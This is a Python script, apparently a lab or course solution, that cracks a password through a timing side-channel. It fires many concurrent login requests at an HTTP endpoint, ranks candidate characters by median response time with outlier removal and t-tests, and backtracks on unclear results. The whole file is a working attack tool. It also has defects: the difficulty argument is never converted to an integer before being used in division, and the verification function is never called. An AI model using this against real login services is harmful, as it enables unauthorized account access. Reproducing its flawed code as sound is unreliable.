import sys
import time
import asyncio
import aiohttp
import numpy as np
from scipy import stats
import argparse

# configuration
CHARACTERS = "abcdefghijklmnopqrstuvwxyz"
PASSWORD_LENGTH = 16    # we know this from the code
INITIAL_RETRIES = 15    # first layer of testing 
SECOND_RETRIES = 10     # second layer of testing
FINAL_RETRIES = 15      # third layer of testing
MAX_CONCURRENT_REQUESTS = 30 
SESSION_TIMEOUT = aiohttp.ClientTimeout(total=10) 

#function to print to stderr instead of stdout
def eprint(*args, **kwargs):
    """Print to stderr instead of stdout."""
    print(*args, file=sys.stderr, **kwargs)

# function to remove outliers from timing measurements using z score method
def remove_outliers(timings: list[float], zscore_threshold: float = 2.5) -> list[float]:
    if len(timings) < 4:  # need enough data for meaningful statistics
        return timings
    
    # remove infinities (timeouts) and calculate z scores
    timings = np.array([t for t in timings if t != float('inf')])
    if len(timings) == 0:
        return []
    
    # z scores are used to identify outliers
    z_scores = np.abs(stats.zscore(timings))

    #if z score is less than threshold we keep the timing
    return timings[z_scores < zscore_threshold].tolist()

# function to process timing data to get robust statistics
# returns a 3 tuple with median time, median absolute deviation (MAD) and a boolean indicating if the data is valid
def process_timing_data(timings: list[float], min_samples: int = 5) -> tuple[float, float, bool]:
    # remove infinities and outliers
    clean_timings = remove_outliers([t for t in timings if t != float('inf')])
    
    if len(clean_timings) < min_samples:
        return 0.0, 0.0, False # not enough data
        
    median_time = np.median(clean_timings)
    # calculate MAD (Median Absolute Deviation)
    mad = stats.median_abs_deviation(clean_timings, scale='normal')
    
    return median_time, mad, True

class PasswordCracker:
    def __init__(self, server_url: str, difficulty: int):
        self.server_url = server_url
        self.difficulty = difficulty
        self.max_concurrent = max(5, MAX_CONCURRENT_REQUESTS // difficulty) # limit concurrent requests for performance
        self.timeout = 5 + (1 * difficulty)
        self.session = None 

    # measure single request to the server and return that time
    async def measure_request(self, url: str) -> float:
        try:
            start = time.time()
            async with self.session.get(url, timeout=self.timeout) as response:
                await response.text()
            return time.time() - start
        except Exception: #if request fails return infinity
            return float('inf')

    # measure timing for a password with automatic retries for failed requests
    async def measure_timing(self, username: str, password: str, num_retries: int) -> list[float]:
        """Measure response times for a password with automatic retries for failed requests."""
        url = f"{self.server_url}/?user={username}&password={password}&difficulty={self.difficulty}"
        timings = []
        max_attempts = num_retries + 5  # Allow some extra attempts for failed requests
        
        while len(timings) < num_retries and max_attempts > 0:
            tasks = [self.measure_request(url) for _ in range(min(self.max_concurrent, num_retries - len(timings)))]
            results = await asyncio.gather(*tasks)
            valid_times = [t for t in results if t != float('inf')]
            timings.extend(valid_times)
            max_attempts -= len(tasks)
            
            if len(tasks) >= self.max_concurrent:
                await asyncio.sleep(0.05 / self.difficulty)
        
        return timings

    # test a set of characters with specified number of retries and outlier removal
    async def test_characters(self, username: str, partial_password: str, characters: str, num_retries: int, round_num: int) -> dict:
       
        eprint(f"\nRound {round_num} testing {len(characters)} characters with {num_retries} retries each")
        
        results = {}
        for char in characters:
            candidate = partial_password + char + 'a' * (PASSWORD_LENGTH - len(partial_password) - 1) # fill with 'a' so we dont mess up the length
            timings = await self.measure_timing(username, candidate, num_retries)
            median_time, mad_score, is_valid = process_timing_data(timings)
            
            if is_valid: # only store valid data
                results[char] = {
                    'timings': timings,
                    'median': median_time,
                    'mad': mad_score
                }
                eprint(f"Char '{char}': median={median_time*1000:.1f}ms, MAD={mad_score*1000:.1f}ms")
        
        return results

    # test a position in the password and return the best character and a boolean indicating if the result is significant
    async def test_position(self, username: str, partial_password: str, position: int) -> tuple[str, bool]:
       
        eprint(f"\nTesting position {position}")
        
        # Track best character and significance across all rounds
        best_overall = {
            'char': None,
            'p_value': 1.0,
            'timing_diff': 0,
            'mad_ratio': 1.0,
            'round': 0
        }
        
        # layer 1 of testing
        round1_results = await self.test_characters(username, partial_password, CHARACTERS, INITIAL_RETRIES, 1)
        if not round1_results:
            return None, False
            
        # get timing + data for each character
        medians = [data['median'] for data in round1_results.values()]
        mads = [data['mad'] for data in round1_results.values()]
        avg_mad = np.mean(mads)
        
        # calculate timing spread relative to noise level
        max_median = max(medians)
        min_median = min(medians)
        timing_spread = (max_median - min_median) / avg_mad # spread in terms of median absolute deviation
        
        # sort characters by median time to feed only half of alphabet into next layer
        sorted_chars = sorted(round1_results.items(), key=lambda x: x[1]['median'], reverse=True)
        best_char = sorted_chars[0][0] # current best char
        
        # early detection if timing spread is large enough
        if timing_spread > 3.0 and position > 0:  
            eprint(f"Clear timing separation: spread = {timing_spread:.1f} MADs")
            return best_char, True
            
        # layer 2, focus on half most promising candidates
        round2_chars = ''.join(char for char, _ in sorted_chars[:len(CHARACTERS)//2])
        round2_results = await self.test_characters(username, partial_password, round2_chars, 
                                                  SECOND_RETRIES, 2)
        
        if not round2_results: # if no results return best char from round 1
            return sorted_chars[0][0], False
            
        # final round with most quarter most pormising candidates
        sorted_chars = sorted(round2_results.items(), key=lambda x: x[1]['median'], reverse=True) 
        final_chars = ''.join(char for char, _ in sorted_chars[:len(round2_chars)//2])
        
        final_results = await self.test_characters(username, partial_password, final_chars, FINAL_RETRIES, 3)
        if not final_results: # if no results return best char from round 2
            return sorted_chars[0][0], False
        
        # final best char check
        best_char = max(final_results.items(), key=lambda x: x[1]['median'])[0] # best char from final round
        best_timings = remove_outliers(final_results[best_char]['timings']) # remove outliers
        other_timings = [] 
        for char, data in final_results.items():
            if char != best_char:
                other_timings.extend(remove_outliers(data['timings'])) # all but the best char
        
        if len(best_timings) >= 5 and len(other_timings) >= 5: # check if we have enough data
            t_stat, p_value = stats.ttest_ind(best_timings, other_timings, equal_var=False)
            timing_diff = (np.median(best_timings) - np.median(other_timings)) / np.median(other_timings) * 100
            
            # calculate noise level using MAD ratio
            best_mad = stats.median_abs_deviation(best_timings, scale='normal')
            other_mad = stats.median_abs_deviation(other_timings, scale='normal')
            mad_ratio = best_mad / other_mad if other_mad > 0 else float('inf')
            
            # adaptive significance criteria based on position and consistency
            if position == 0:
                is_significant = p_value < 0.2 or timing_diff > 12
            else:
                # become less strict the further index we are on
                position_factor = min((position + 1) / 4, 1.0)  # Scales from 0.25 to 1.0
                
                # base timing threshold that decreases with position (from 20% to 8% overall)
                base_timing_threshold = max(20 - (position * 2), 8)
                
                # check for consistent noise levels
                has_consistent_noise = 0.7 < mad_ratio < 1.4
                
                # accept result if any of the following conditions are met:
                # 1. ttest value low enough OR
                # 2. strong timing difference OR
                # 3. evidence with consistent noise OR
                # 4. any timing difference > 8% after position 4
                is_significant = (
                    p_value < (0.2 + (position_factor * 0.4)) or  # p-value threshold scales from 0.2 to 0.6
                    timing_diff > base_timing_threshold or
                    (has_consistent_noise and timing_diff > 8) or
                    (position > 4 and has_consistent_noise and timing_diff > 5)
                )
            
            eprint(f"Final analysis: p-value={p_value:.6f}, timing_diff={timing_diff:.1f}%, mad_ratio={mad_ratio:.2f}")
            return best_char, is_significant
            
        return best_char, position == 0  # accept first valid position 

    async def find_password(self, username: str) -> str:
      
        eprint(f"Finding password (difficulty {self.difficulty})...")
        password = ""
        position = 0
        
        # create a new session for each password
        async with aiohttp.ClientSession(timeout=SESSION_TIMEOUT) as session:
            self.session = session
            
            while position < PASSWORD_LENGTH:
                best_char, is_significant = await self.test_position(username, password, position)
                
                if not best_char: # if no best char found backtrack to previous position (not needed for submissing i guess but its nice)
                    if position > 0:
                        position -= 1
                        password = password[:-1]
                        eprint(f"No valid results - backtracking to position {position}")
                    continue
                
                if is_significant:
                    password += best_char
                    eprint(f"Selected character: '{best_char}'")
                    eprint(f"Current password: {password}")
                    position += 1
                else:
                    if position > 0:
                        position -= 1
                        password = password[:-1]
                        eprint(f"No significant difference - backtracking to position {position}")
                    else: # we're at the first position so we'll go forward despite no best character
                        password += best_char
                        eprint(f"Selected first character: '{best_char}'")
                        position += 1
                
                progress = position / PASSWORD_LENGTH * 100 # calculate progress to display, for myself 
                eprint(f"Progress: {progress:.1f}%")
        
        return password

async def verify_password(server_url: str, username: str, password: str, difficulty: int) -> bool:
    """Verify if the password is correct."""
    url = f"{server_url}/?user={username}&password={password}&difficulty={difficulty}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                result = await response.text()
                return result.strip() == "1"
    except:
        return False

async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('username')
    parser.add_argument('difficulty')
    server = 'http://127.0.0.1' #CHANGE ACCORDINGLY !!!!!!!!!!!!
    
    args = parser.parse_args()
    
    cracker = PasswordCracker(server, args.difficulty)
    password = await cracker.find_password(args.username)
    
    print(password)  # print anyway, might be correct despite verification failure

if __name__ == "__main__":
    asyncio.run(main())